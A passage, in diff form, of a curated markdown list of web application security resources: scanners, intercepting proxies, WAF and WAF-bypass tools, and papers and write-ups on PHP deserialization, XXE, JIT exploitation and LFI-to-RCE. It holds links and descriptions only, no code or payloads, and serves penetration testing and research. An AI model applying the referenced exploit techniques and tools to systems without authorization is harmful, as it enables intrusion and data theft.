+    web security scanner is dedicated only one CMS.
+- Sharepoint
+
+- [Sparty - Sharepoint/Frontpage Auditing Tool](https://github.com/alias1/sparty)
+  * Sparty is an open source tool written in python to audit web applications
+    using sharepoint and frontpage architecture. The motivation behind this tool
+    is to provide an easy and robust way to scrutinize the security
+    configurations of sharepoint and frontpage based web applications. Due to
+    the complex nature of these web administration software, it is required to
+    have a simple and efficient tool that gathers information, check access
+    permissions, dump critical information from default files and perform
+    automated exploitation if security risks are identified. A number of
+    automated scanners fall short of this and Sparty is a solution to that.
+- Wordpress
+
+- [WPScan](https://github.com/wpscanteam/wpscan)
+  * WPScan is a black box WordPress vulnerability scanner.
+- [WPSeku](https://github.com/m4ll0k/WPSeku)
+  * Wordpress Security Scanner
+
+### HTML 5
+
+* [HTML Standard Documentation](https://html.spec.whatwg.org/multipage/infrastructure.html#unicode-code-point)
+* [HTML5 Security Cheatsheet](https://github.com/cure53/H5SC)
+* [SH5ARK](http://sh5ark.professionallyevil.com)
+
+  * The Securing HTML5 Assessment Resource Kit, or SH5ARK, is an open source
+    project that provides a repository of HTML5 features, proof-of-concept
+    attack code, and filtering rules. The purpose of this project is to provide
+    a single repository that can be used to collect sample code of vulnerable
+    HTML5 features, actual attack code, and filtering rules to help prevent
+    attacks and abuse of these features. The intent of the project is to bring
+    awareness to the opportunities that HTML5 is providing for attackers, to
+    help identify these attacks, and provide measures for preventing them
+
+* [Presentation on SH5ARK](https://www.youtube.com/watch?v=1ZZ-vIwmWx4)
+* [GetSH5ARK here](http://sourceforge.net/projects/sh5ark/)
+
+### JavaScript
+
+* General
+
+  * [DOM Clobbering Attack](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)
+
+* Tools
+
+* [JSDetox](http://relentless-coding.org/projects/jsdetox/info)
+
+  * JSDetox is a tool to support the manual analysis of malicious Javascript
+    code.
+
+* [Dom Flow - Untangling The DOM For More Easy-Juicy Bugs - BH USA 2015](https://www.youtube.com/watch?v=kedmtrIEW1k&list=PLH15HpR5qRsXF78lrpWP2JKpPJs_AFnD7&index=111)
+
+### Java Server Faces (JSF)
+
+* [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - alphabot](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
+
+### PHP
+
+* [Browser Security Whitepaper - Cure53](https://cure53.de/browser-security-whitepaper.pdf/)
+* [OWASP Proactive Controls 3.0](https://docs.google.com/document/d/1bQKisfXQ2XRwkcUaTvVTR7bpzVgbwIhDA1O6hUbywiY/mobilebasic)
+* [Php Codz Hacking](https://github.com/80vul/phpcodz)
+
+  * Writeups of specific PHP vulns
+
+#### Code Reuse
+
+* [The ReflectionClass class](https://secure.php.net/ReflectionClass)
+* [Autoloading Classes](http://www.php.net/language.oop5.autoload)
+* [PHP Autoload Invalid Classname Injection](https://hakre.wordpress.com/2013/02/10/php-autoload-invalid-classname-injection/)
+* [Code Reuse Attacks in PHP: Automated POP Chain Generation](https://www.syssec.rub.de/media/emma/veroeffentlichungen/2014/09/10/POPChainGeneration-CCS14.pdf)
+
+  * In this paper, we study code reuse attacks in the con- text of PHP-based web
+    applications. We analyze how PHP object injection (POI) vulnerabilities can
+    be exploited via property-oriented programming (POP) and perform a
+    systematic analysis of available gadgets in common PHP applications.
+    Furthermore, we introduce an automated approach to statically detect POI
+    vulnerabilities in object-oriented PHP code. Our approach is also capable of
+    generating POP chains in an automated way. We implemented a prototype of the
+    proposed approach and evaluated it with 10 well-known applications. Overall,
+    we detected 30 new POI vulnerabilities and 28 new gadget chains
+
+* [Utilizing Code Reuse/ROP in PHP Application Exploits - BH 2010](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)
+* [POP-Exploit](https://github.com/enddo/POP-Exploit)
+
+  * Research into Property Oriented Programming about php applications.
+
+#### De/Serialization
+
+* [serialize - php](http://us3.php.net/serialize)
+* [unserialize - php](https://secure.php.net/unserialize)
+* [PHP Object Injection](https://www.owasp.org/index.php/PHP_Object_Injection)
+* [Writing Exploits For Exotic Bug Classes: unserialize()](<https://www.alertlogic.com/blog/writing-exploits-for-exotic-bug-classes-unserialize()/>)
+* [Is PHP unserialize() exploitable without any 'interesting' methods? - StackOverflow](https://security.stackexchange.com/questions/77549/is-php-unserialize-exploitable-without-any-interesting-methods)
+* [Remote code execution via PHP [Unserialize] - notsosecure](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)
+
+#### Type Juggling
+
+* [Writing Exploits For Exotic Bug Classes: PHP Type Juggling](https://turbochaos.blogspot.com.au/2013/08/exploiting-exotic-bugs-php-type-juggling.html)
+* [PHP Magic Tricks: Type Juggling](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf)
+* [PHP’s “Magic Hash” Vulnerability (Or Beware Of Type Juggling)](https://web.archive.org/web/20150530075600/http://blog.astrumfutura.com/2015/05/phps-magic-hash-vulnerability-or-beware-of-type-juggling)
+
+### REST/SOAP/Web Services(WSDL)
+
+#### Learning/Reference
+
+* [RESTful Services, The Web Security Blind Spot](https://www.youtube.com/watch?feature=player_embedded&v=pWq4qGLAZHI#!)
+* [Blogpost](https://xiom.com/2016/10/31/restful-services-web-security-blind-spot/)
+* [Presentation Slides -pdf](https://xiomcom.files.wordpress.com/2016/10/security-testing-for-rest-applications-v6-april-2013.pdf)
+* [Cracking and Fixing REST APIs](http://www.sempf.net/post/Cracking-and-Fixing-REST-APIs)
+* [Cracking and fixing REST services](http://www.irongeek.com/i.php?page=videos/converge2015/track109-cracking-and-fixing-rest-services-bill-sempf)
+* [Representational State Transfer - Wikipedia](https://en.wikipedia.org/wiki/Representational_state_transfer)
+* [Web Services Security Testing Cheat Sheet Introduction - OWASP](https://www.owasp.org/index.php/Web_Service_Security_Testing_Cheat_Sheet)
+* [Service-Oriented-Architecture](https://en.wikipedia.org/wiki/Service-oriented_architecture)
+* [Microservices](https://en.wikipedia.org/wiki/Microservices)
+* [Learn REST: A Tutorial](http://rest.elkstein.org/)
+
+#### Attacking
+
+* [REST Security Cheat Sheet](REST Security Cheat Sheet)
+* [REST Assessment Cheat Sheet](https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet)
+* [Damn Vulnerable Web Services dvws](https://github.com/snoopysecurity/dvws)
+
+  * Damn Vulnerable Web Services is an insecure web application with multiple
+    vulnerable web service components that can be used to learn real world web
+    service vulnerabilities.
+
+* [WS-Attacker](https://github.com/RUB-NDS/WS-Attacker)
+
+  * WS-Attacker is a modular framework for web services penetration testing. It
+    is developed by the Chair of Network and Data Security, Ruhr University
+    Bochum (http://nds.rub.de/ ) and the Hackmanit GmbH (http://hackmanit.de/).
+
+* [WS-Attacks.org](http://www.ws-attacks.org/Welcome_to_WS-Attacks)
+
+  * WS-Attacks.org is not a new web service standard by the OASIS Group or W3C;
+    instead it presents the flaws of today's web service standards and
+    implementations in regard to web service security! WS-Attacks.org aims at
+    delivering the most comprehensive enumeration of all known web service
+    attacks.
+
+* [Exploiting CVE-2017-8759: SOAP WSDL Parser Code Injection](https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/)
+* [The S stands for Simple](http://harmful.cat-v.org/software/xml/soap/simple)
+
+  * Satire(Only it's not) of a conversation about SOAP
+
+### Ruby/Ruby on Rails
+
+* General
+
+* [Ruby on Rails Security Guide](http://guides.rubyonrails.org/security.html)
+* [Ruby on Rails Cheatsheet - OWASP](https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet)
+* [Executing commands in ruby](http://blog.bigbinary.com/2012/10/18/backtick-system-exec-in-ruby.html)
+* [Attacking Ruby on Rails Applications - phrack](http://phrack.org/issues/69/12.html#article)
+* [Going AUTH the Rails on a Crazy Train: A Dive into Rails Authentication and Authorization](https://www.blackhat.com/docs/eu-15/materials/eu-15-Jarmoc-Going-AUTH-The-Rails-On-A-Crazy-Train-wp.pdf)
+* [Property Oriented Programming - Applied to Ruby](https://slides.com/benmurphy/property-oriented-programming/fullscreen#/)
+* [Pentesting Django and Rails](https://es.slideshare.net/levigross/pentesting-django-and-rails)
+
+### Scraping
+
+* [WeasyPrint](http://weasyprint.org/)
+
+  * WeasyPrint is a visual rendering engine for HTML and CSS that can export to
+    PDF. It aims to support web standards for printing. WeasyPrint is free
+    software made available under a BSD license.
+
+* [Scrapy](https://scrapy.org/)
+
+  * An open source and collaborative framework for extracting the data you need
+    from websites.
+
+### Site/Webapp Scanners
+
+* nikto
+* [Spaghetti - Web Application Security Scanner](https://github.com/m4ll0k/Spaghetti)
+
+  * Spaghetti is an Open Source web application scanner, it is designed to find
+    various default and insecure files, configurations, and misconfigurations.
+    Spaghetti is built on python2.7 and can run on any platform which has a
+    Python environment.
+
+* [skipfish](https://code.google.com/p/skipfish/)
+
+  * Skipfish is an active web application security reconnaissance tool. It
+    prepares an interactive sitemap for the targeted site by carrying out a
+    recursive crawl and dictionary-based probes. The resulting map is then
+    annotated with the output from a number of active (but hopefully
+    non-disruptive) security checks. The final report generated by the tool is
+    meant to serve as a foundation for professional web application security
+    assessments.
+
+* [wikto](https://github.com/sensepost/wikto)
+
+  * Wikto is Nikto for Windows - but with a couple of fancy extra features
+    including Fuzzy logic error code checking, a back-end miner, Google assisted
+    directory mining and real time HTTP request/response monitoring. Wikto is
+    coded in C# and requires the .NET framework.
+
+* [RAWR - Rapid Assessment of Web Resources](https://bitbucket.org/al14s/rawr/wiki/Home)
+
+* [Arachni Web Scanner](http://www.arachni-scanner.com/)
+
+  * Arachni is an Open Source, feature-full, modular, high-performance Ruby
+    framework aimed towards helping penetration testers and administrators
+    evaluate the security of web applications. It is smart, it trains itself by
+    monitoring and learning from the web application's behavior during the scan
+    process and is able to perform meta-analysis using a number of factors in
+    order to correctly assess the trustworthiness of results and intelligently
+    identify (or avoid) false-positives.
+
+* [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
+
+  * WhatWeb identifies websites. Its goal is to answer the question, "What is
+    that Website?". WhatWeb recognises web technologies including content
+    management systems (CMS), blogging platforms, statistic/analytics packages,
+    JavaScript libraries, web servers, and embedded devices. WhatWeb has over
+    1500 plugins, each to recognise something different. WhatWeb also identifies
+    version numbers, email addresses, account IDs, web framework modules, SQL
+    errors, and more.
+
+* [WATOBO](https://github.com/siberas/watobo)
+
+  * WATABO is a security tool for testing web applications. It is intended to
+    enable security professionals to perform efficient (semi-automated) web
+    application security audits.
+
+* [YASUO](https://github.com/0xsauby/yasuo)
+
+  * Yasuo is a ruby script that scans for vulnerable 3rd-party web applications.
+
+* [CMSExplorer](https://code.google.com/p/cms-explorer/)
+
+  * CMS Explorer is designed to reveal the the specific modules, plugins,
+    components and themes that various CMS driven web sites are running.
+    Additionally, CMS Explorer can be used to aid in security testing. While it
+    performs no direct security checks, the "explore" option can be used to
+    reveal hidden/library files which are not typically accessed by web clients
+    but are nonetheless accessible. This is done by retrieving the module's
+    current source tree and then requesting those file names from the target
+    system. These requests can be sent through a distinct proxy to help
+    "bootstrap" security testing tools like Burp, Paros, Webinspect, etc.
+
+* [BlindElephant Web Application Fingerprinter](http://blindelephant.sourceforge.net/)
+
+  * The BlindElephant Web Application Fingerprinter attempts to discover the
+    version of a (known) web application by comparing static files at known
+    locations against precomputed hashes for versions of those files in all all
+    available releases. The technique is fast, low-bandwidth, non-invasive,
+    generic, and highly automatable.
+
+* [ParrotNG](https://github.com/ikkisoft/ParrotNG)
+
+  * ParrotNG is a tool capable of identifying Adobe Flex applications (SWF)
+    vulnerable to CVE-2011-2461
+
+* [OpenDoor](https://github.com/stanislav-web/OpenDoor)
+
+  * OpenDoor OWASP is console multifunctional web sites scanner. This
+    application find all possible ways to login, index of/ directories, web
+    shells, restricted access points, subdomains, hidden data and large backups.
+    The scanning is performed by the built-in dictionary and external
+    dictionaries as well. Anonymity and speed are provided by means of using
+    proxy servers.
+
+### Web Sockets
+
+* [The WebSocket Protocol Standard - IETF](https://tools.ietf.org/html/rfc6455)
+
+* [WebSocket Protocol - RFC Draft 17](https://tools.ietf.org/html/draft-ietf-hybi-thewebsocketprotocol-17)
+
+### Web Proxies
+
+* [Burpsuite](http://portswigger.net/burp/)
+
+  * Burp Suite is an integrated platform for performing security testing of web
+    applications. Its various tools work seamlessly together to support the
+    entire testing process, from initial mapping and analysis of an
+    application's attack surface, through to finding and exploiting security
+    vulnerabilities.
+
+* [ZAP - Zed Attack Proxy](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)
+
+  * The Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing
+    tool for finding vulnerabilities in web applications. It is designed to be
+    used by people with a wide range of security experience and as such is ideal
+    for developers and functional testers who are new to penetration testing.
+    ZAP provides automated scanners as well as a set of tools that allow you to
+    find security vulnerabilities manually.
+
+* [Paros - Web Proxy](http://sourceforge.net/projects/paros/)
+
+  * A Java based HTTP/HTTPS proxy for assessing web application vulnerability.
+    It supports editing/viewing HTTP messages on-the-fly. Other featuers include
+    spiders, client certificate, proxy-chaining, intelligent scanning for XSS
+    and SQL injections etc.
+
+* [Mallory: Transparent TCP and UDP Proxy](https://intrepidusgroup.com/insight/mallory/)
+
+  * Mallory is a transparent TCP and UDP proxy. It can be used to get at those
+    hard to intercept network streams, assess those tricky mobile web
+    applications, or maybe just pull a prank on your friend.
+
+* [TCP Catcher](http://www.tcpcatcher.org/)
+
+  * TcpCatcher is a free TCP, SOCKS, HTTP and HTTPS proxy monitor server
+    software.
+
+* [wssip](https://github.com/nccgroup/wssip)
+
+  * Application for capturing, modifying and sending custom WebSocket data from
+    client to server and vice versa.
+
+### WebRTC
+
+* [STUN IP Address requests for WebRTC](https://github.com/diafygi/webrtc-ips)
+
+### Web Application Firewalls(WAFs)
+
+* [ModSecurity](https://github.com/SpiderLabs/ModSecurity)
+
+  * ModSecurity is an open source, cross platform web application firewall (WAF)
+    engine for Apache, IIS and Nginx that is developed by Trustwave's
+    SpiderLabs. It has a robust event-based programming language which provides
+    protection from a range of attacks against web applications and allows for
+    HTTP traffic monitoring, logging and real-time analys
+
+* [Shadow Daemon](https://shadowd.zecure.org/overview/introduction/)
+
+  * Shadow Daemon is a collection of tools to detect, protocol and prevent
+    attacks on web applications. Technically speaking, Shadow Daemon is a web
+    application firewall that intercepts requests and filters out malicious
+    parameters. It is a modular system that separates web application, analysis
+    and interface to increase security, flexibility and expandability. Shadow
+    Daemon is free software. It is released under the license GPLv2, so its
+    source code can be examined, modified and distributed by everyone.
+
+* [ftw](https://github.com/fastly/ftw)
+
+  * Framework for Testing WAFs (FTW!)
+
+### Bypassing Web Application Firewalls
+
+* [Bypassing WAFs](http://www.nethemba.com/bypassing-waf.pdf)
+* [WAFPASS](https://github.com/wafpassproject/wafpass)
+
+  * Analysing parameters with all payloads' bypass methods, aiming at
+    benchmarking security solutions like WAF.
+
+### Web Application Attack Write-ups
+
+* [Hacking with Pictures - Syscan2015](http://www.slideshare.net/saumilshah/hacking-with-pictures-syscan-2015)
+
+- [Relative Path Overwrite Explanation/Writeup](http://www.thespanner.co.uk/2014/03/21/rpo/)
+
+  * RPO (Relative Path Overwrite) is a technique to take advantage of relative
+    URLs by overwriting their target file. To understand the technique we must
+    first look into the differences between relative and absolute URLs. An
+    absolute URL is basically the full URL for a destination address including
+    the protocol and domain name whereas a relative URL doesn’t specify a domain
+    or protocol and uses the existing destination to determine the protocol and
+    domain.
+
+### ColdFusion
+
+* [Attacking Adobe ColdFusion](http://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html)
+* [ColdFusion Security Resources](https://www.owasp.org/index.php/ColdFusion_Security_Resources)
+* [ColdFusion for Penetration Testers](http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers)
+
+### PHP
+
+* [PHP Generic Gadget Chains: Exploiting unserialize in unknown environments](https://www.ambionics.io/blog/php-generic-gadget-chains)
+* [PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)
+
+  * PHPGGC is a library of unserialize() payloads along with a tool to generate
+    them, from command line or programmatically. When encountering an
+    unserialize on a website you don't have the code of, or simply when trying
+    to build an exploit, this tool allows you to generate the payload without
+    having to go through the tedious steps of finding gadgets and combining
+    them. Currently, the tool supports: Doctrine, Guzzle, Laravel, Monolog,
+    Slim, SwiftMailer.
+
+* [Pwning PHP mail() function For Fun And RCE | New Exploitation Techniques And Vectors](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
+* [Abusing Google App Scripting Through Social Engineering](http://www.redblue.team/2017/02/abusing-google-app-scripting-through.html)
+* [File scanner web app (Part 1 of 5): Stand-up and webserver](http://0xdabbad00.com/2013/09/02/file-scanner-web-app-part-1-of-5-stand-up-and-webserver/)
+
+### Serial
+
+* [Exploiting misuse of Python's "pickle"](https://blog.nelhage.com/2011/03/exploiting-pickle/)
+* [Typosquatting programming language package managers](http://incolumitas.com/2016/06/08/typosquatting-package-managers/)
+
+### CI
+
+* [Hacking Jenkins Servers With No Password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
+* [ebay.com: RCE using CCS](http://secalert.net/#ebay-rce-ccs)
+* [Exploiting Python Code Injection in Web Applications](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)
+* [Unrestricted File Upload Security Testing - Aptive](https://www.aptive.co.uk/blog/unrestricted-file-upload-testing/)
+
+### Web Assembly
+
+* [Web Assembly](http://webassembly.org/)
+* [A cartoon intro to WebAssembly Articles](https://hacks.mozilla.org/category/code-cartoons/a-cartoon-intro-to-webassembly/)
+* [Lin Clark: A Cartoon Intro to WebAssembly | JSConf EU 2017](https://www.youtube.com/watch?v=HktWin_LPf4&app=desktop)
+
+### WebUSB
+
+* [WebUSB API - Sept2017](https://wicg.github.io/webusb/)
+
+### XML
+
+* [Hunting in the Dark - Blind XXE](https://blog.zsec.uk/blind-xxe-learning/)
+* [Leading the Blind to Light! - A Chain to RCE](https://blog.zsec.uk/rce-chain/)
+* [What You Didn't Know About XML External Entities Attacks](http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf)
+* [Black Hat EU 2013 - XML Out-of-Band Data Retrieval](https://www.youtube.com/watch?v=eBm0YhBrT_c)
+* [Slides: XML Out-­Of-Band Data Retrieval - BHEU 2013](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
+* [Generic XXE Detection](http://www.christian-schneider.net/GenericXxeDetection.html)
+* [Advice From A Researcher: Hunting XXE For Fun and Profit](http://blog.bugcrowd.com/advice-from-a-researcher-xxe/)
+* [XXEinjector](https://github.com/enjoiz/XXEinjector)
+
+  * XXEinjector automates retrieving files using direct and out of band methods.
+    Directory listing only works in Java applications. Bruteforcing method needs
+    to be used for other applications
+
+* [Playing with Content-Type – XXE on JSON Endpoints - NETSPI](https://blog.netspi.com/playing-content-type-xxe-json-endpoints/)
+* [FileCry - The New Age of XXE - BH USA 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE.pdf)
+* [XXE OOB exploitation at Java 1.7+ - 2014](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)
+* [Security of applications that parse XML (supplementary) - 2009](http://d.hatena.ne.jp/teracc/20090718)
+* [XXEInjector](https://github.com/enjoiz/XXEinjector)
+
+  * XXEinjector automates retrieving files using direct and out of band methods.
+    Directory listing only works in Java applications. Bruteforcing method needs
+    to be used for other applications.
+
+* [Exploiting XXE In File Upload Functionality](https://www.blackhat.com/docs/us-15/materials/us-15-Vandevanter-Exploiting-XXE-Vulnerabilities-In-File-Parsing-Functionality.pdf)
+
+### Papers
+
+* [The Spy in the Sandbox – Practical Cache Attacks in Javascript](http://iss.oy.ne.ro/SpyInTheSandbox.pdf)
+
+  * We present the first micro-architectural side-channel at- tack which runs
+    entirely in the browser. In contrast to other works in this genre, this
+    attack does not require the attacker to install any software on the victim’s
+    machine – to facilitate the attack, the victim needs only to browse to an
+    untrusted webpage with attacker-controlled con- tent. This makes the attack
+    model highly scalable and ex- tremely relevant and practical to today’s web,
+    especially since most desktop browsers currently accessing the In- ternet
+    are vulnerable to this attack. Our attack, which is an extension of the
+    last-level cache attacks of Yarom et al. [23], allows a remote adversary
+    recover information belonging to other processes, other users and even other
+    virtual machines running on the same physical host as the victim web
+    browser. We describe the fundamentals behind our attack, evaluate its
+    performance using a high bandwidth covert channel and finally use it to
+    construct a system-wide mouse/network activity logger. Defending against
+    this attack is possible, but the required counter- measures can exact an
+    impractical cost on other benign uses of the web browser and of the
+    computer.
+
+* [Self-Exfiltration: The Dangers of Browser-Enforced Information Flow Control](http://ericchen.me/self_exfiltration.pdf)
+
+  * Abstract —Since the early days of Netscape, browser vendors and web security
+    researchers have restricted out-going data based on its destination. The
+    security argument accompanying these mechanisms is that they prevent
+    sensitive user data from being sent to the attacker’s domain. However, in
+    this paper, we show that regulating web information flow based on its
+    destination server is an inherently flawed security practice. It is
+    vulnerable to self-exfiltration attacks, where an adversary stashes stolen
+    information in the database of a whitelisted site, then later independently
+    connects to the whitelisted site to retrieve the information. We describe
+    eight existing browser security mechanisms that are vulnerable to these
+    “self-exfiltration” attacks. Furthermore, we discovered at least one
+    exfiltration channel for each of the Alexa top 100 websites. None of the
+    existing information flow control mechanisms we surveyed are sufficient to
+    protect data from being leaked to the attacker. Our goal is to prevent
+    browser vendors and researchers from falling into this trap by designing
+    more systems that are vulnerable to self-exfiltration.
+
+* [The Devil is in the Constants: Bypassing Defenses in Browser JIT Engines](http://users.ics.forth.gr/~elathan/papers/ndss15.pdf)
+
+  * Abstract —Return-oriented programming (ROP) has become the dominant form of
+    vulnerability exploitation in both user and kernel space. Many defenses
+    against ROP exploits exist, which can significantly raise the bar against
+    attackers. Although protecting existing code, such as applications and the
+    kernel, might be possible, taking countermeasures against dynamic code,
+    i.e., code that is generated only at run-time, is much harder. Attackers
+    have already started exploiting Just-in-Time (JIT) engines, available in all
+    modern browsers, to introduce their (shell)code (either native code or
+    re-usable gadgets) during JIT compilation, and then taking advantage of it.
+    Recognizing this immediate threat, browser vendors started employing
+    defenses for hardening their JIT engines. In this paper, we show that—no
+    matter the employed defenses—JIT engines are still exploitable using solely
+    dynamically generated gadgets. We demonstrate that dynamic ROP payload
+    construction is possible in two modern web browsers without using any of the
+    available gadgets contained in the browser binary or linked libraries.
+    First, we exploit an open source JIT engine (Mozilla Firefox) by feeding it
+    malicious JavaScript, which once processed generates all re- quired gadgets
+    for running any shellcode successfully. Second, we exploit a proprietary JIT
+    engine, the one in the 64-bit Microsoft Internet Explorer, which employs
+    many undocumented, specially crafted defenses against JIT exploitation. We
+    manage to bypass all of them and create the required gadgets for running any
+    shellcode successfully. All defensive techniques are documented in this
+    paper to assist other researchers. Furthermore, besides showing how to
+    construct ROP gadgets on-the-fly, we also show how to discover them
+    on-the-fly, rendering current randomization schemes ineffective. Finally, we
+    perform an analysis of the most important defense currently employed, namely
+    constant blinding , which shields all three-byte or larger immediate values
+    in the JIT buffer for hindering the construction of ROP gadgets. Our
+    analysis suggests that extending constant blinding to all immediate values
+    (i.e., shielding 1-byte and 2-byte constants) dramatically decreases the JIT
+    engine’s performance, introducing up to 80% additional instructions.
+
+* [Cookieless Monster: Exploring the Ecosystem of Web-based Device Fingerprinting](http://securitee.org/files/cookieless_sp2013.pdf)
+
+  * Abstract —The web has become an essential part of our society and is
+    currently the main medium of information delivery. Billions of users browse
+    the web on a daily basis, and there are single websites that have reached
+    over one billion user accounts. In this environment, the ability to track
+    users and their online habits can be very lucrative for advertising
+    companies, yet very intrusive for the privacy of users. In this paper, we
+    examine how web-based device fingerprint- ing currently works on the
+    Internet. By analyzing the code of three popular browser-fingerprinting code
+    providers, we reveal the techniques that allow websites to track users
+    without the need of client-side identifiers. Among these techniques, we show
+    how current commercial fingerprinting approaches use questionable practices,
+    such as the circumvention of HTTP proxies to discover a user’s real IP
+    address and the installation of intrusive browser plugins. At the same time,
+    we show how fragile the browser ecosystem is against fingerprinting through
+    the use of novel browser- identifying techniques. With so many different
+    vendors involved in browser development, we demonstrate how one can use
+    diversions in the browsers’ implementation to distinguish successfully not
+    only the browser-family, but also specific major and minor versions. Browser
+    extensions that help users spoof the user-agent of their browsers are also
+    evaluated. We show that current commercial approaches can bypass the
+    extensions, and, in addition, take advantage of their shortcomings by using
+    them as additional fingerprinting features.
+
+* [SSL/TLS Interception Proxies and Transitive Trust](http://media.blackhat.com/bh-eu-12/Jarmoc/bh-eu-12-Jarmoc-SSL_TLS_Interception-WP.pdf)
+
+  * Secure Sockets Layer (SSL) [ 1 ] and its successor Transport Layer Security
+    (TLS) [ 2 ] have become key components of the modern Internet . The privacy,
+    integrity, and authenticity [ 3 ][ 4 ] provided by these protocols are
+    critical to allowing sensitive communications to occur . Without these
+    systems, e - commerce, online banking , and business - to - business
+    exchange of information would likely be far less frequent. Threat actors
+    have also recognized the benefits of transport security, and they are
+    increasingly turning to SSL to hide their activities . Advanced Persistent
+    Threat ( APT ) attackers [ 5 ] , botnets [ 6 ] , and eve n commodity web
+    attacks can leverage SSL encryption to evade detection. To counter these
+    tactics, organizations are increasingly deploying security controls that
+    intercept end - to - end encrypted channels. Web proxies, data loss
+    prevention ( DLP ) systems, spec ialized threat detection solutions, and
+    network intrusion prevention systems ( N IPS ) offer functionality to
+    intercept, inspect , and filter encrypted traffic. Similar functionality is
+    present in lawful intercept systems and solutions enabling the broad surve
+    illance of encrypted communications by governments. Broadly classified as
+    “SSL/TLS interception proxies ,” these solutions act as a “ man in the
+    middle , ” violating the end - to - end security promises of SSL. This type
+    of interception comes at a cost . Intercepti ng SSL - encrypted connections
+    sacrifices a degree of privacy and integrity for the benefit of content
+    inspection, often at the risk of authenticity and endpoint validation .
+    Implementers and designers of SSL interception proxies should consider these
+    risks and understand how their systems operate in unusual circumstances
+
+* [Scriptless Attacks – Stealing the Pie Without Touching the Sill](http://www.syssec.rub.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf)
+
+  * Due to their high practical impact, Cross-Site Scripting (X SS) attacks have
+    attracted a lot of attention from the security community members. In the
+    same way, a plethora of more or less effective defense techniques have been
+    proposed, ad- dressing the causes and effects of XSS vulnerabilities. As a
+    result, an adversary often can no longer inject or even execute arbitrary
+    scripting code in several real-life scen arios. In this paper, we examine
+    the attack surface that remains after XSS and similar scripting attacks are
+    supposedly mit- igated by preventing an attacker from executing JavaScript
+    code. We address the question of whether an attacker really needs JavaScript
+    or similar functionality to perform attac ks aiming for information theft.
+    The surprising result is that an attacker can also abuse Cascading Style
+    Sheets (CSS) in combination with other Web techniques like plain HTML,
+    inactive SVG images or font files. Through several case studies, we
+    introduce the so called scriptless attacks and demonstrate that an adversary
+    might not need to execute code to preserve his ability to extract sensitive
+    informati on from well protected websites. More precisely, we show that an
+    attacker can use seemingly benign features to build side channel attacks
+    that measure and exfiltrate almost arbitrar y data displayed on a given
+    website. We conclude this paper with a discussion of potential mit- igation
+    techniques against this class of attacks. In additi on, we have implemented
+    a browser patch that enables a website to make a vital determination as to
+    being loaded in a de- tached view or pop-up window. This approach proves
+    useful for prevention of certain types of attacks we here discuss.
+
+* [A Placement Vulnerability Study in Multi-Tenant Public Clouds](https://www.usenix.org/node/191017)
+* [LFI2RCE (Local File Inclusion to Remote Code Execution) advanced exploitation: /proc shortcuts](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/)
+
+  * This paper exposes the ability from the attacker standpoint to use /proc in
+    order to exploit LFI (Local File Inclusion) vulnerabilities.
+
+* [Cracking the Lens: Targeting HTTP's Hidden Attack Surface](https://portswigger.net/knowledgebase/papers/CrackingTheLens-whitepaper.pdf)
+* [Browser Security White Paper - Cure53](https://browser-security.x41-dsec.de/X41-Browser-Security-White-Paper.pdf)
+
+### Miscellaneous
+
+* [unindexed](https://github.com/mroth/unindexed/blob/master/README.md) \* The
+  site is constantly searching for itself in Google, over and over and over, 24
+  hours a day. The instant it finds itself in Google search results, the site
+  will instantaneously and irrevocably securely delete itself. Visitors can
+  contribute to the public content of the site, these contributions will also be
+  destroyed when the site deletes itself.
+
+* [COWL: A Confinement System for the Web](http://cowl.ws/) \* Robust JavaScript
+  confinement system for modern web browsers. COWL introduces label-based
+  mandatory access control to browsing contexts (pages, iframes, etc.) in a way
+  that is fully backward-compatible with legacy web content.
+* [Paper](http://www.scs.stanford.edu/~deian/pubs/stefan:2014:protecting.pdf)
+
+### Burp Stuff/Plugins
+
+* Tutorials/Tips/Stuff
+
+* [OWASP Top 10: Hacking Web Applications with Burp Suite - Chad Furman](https://www.youtube.com/watch?v=2p6twRRXK_o)
+* [Burp Pro : Real-life tips and tricks](https://hackinparis.com/talk-nicolazs-gregoire)
+* [Behind enemy lines: Bug hunting with Burp Infiltrator](http://blog.portswigger.net/2017/06/behind-enemy-lines-bug-hunting-with.html)
+* [Automating Web Apps Input fuzzing via Burp Macros](http://blog.securelayer7.net/automating-web-apps-input-fuzzing-via-burp-macros/)
+
+* Plugins
+
+* [Adapting Burp Extensions for Tailored Pentesting](http://blog.portswigger.net/2017/08/adapting-burp-extensions-for-tailored.html)
+* [AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix)
+
+  * AuthMatrix is a Burp Suite extension that provides a simple way to test
+    authorization in web applications and web services.
+
+* [Autorize](https://github.com/Quitten/Autorize)
+  * Autorize is an automatic authorization enforcement detection extension for
+    Burp Suite. It was written in Python by Barak Tawily, an application
+    security expert, and Federico Dotta, a security expert at Mediaservice.net.
+    Autorize was designed to help security testers by performing automatic
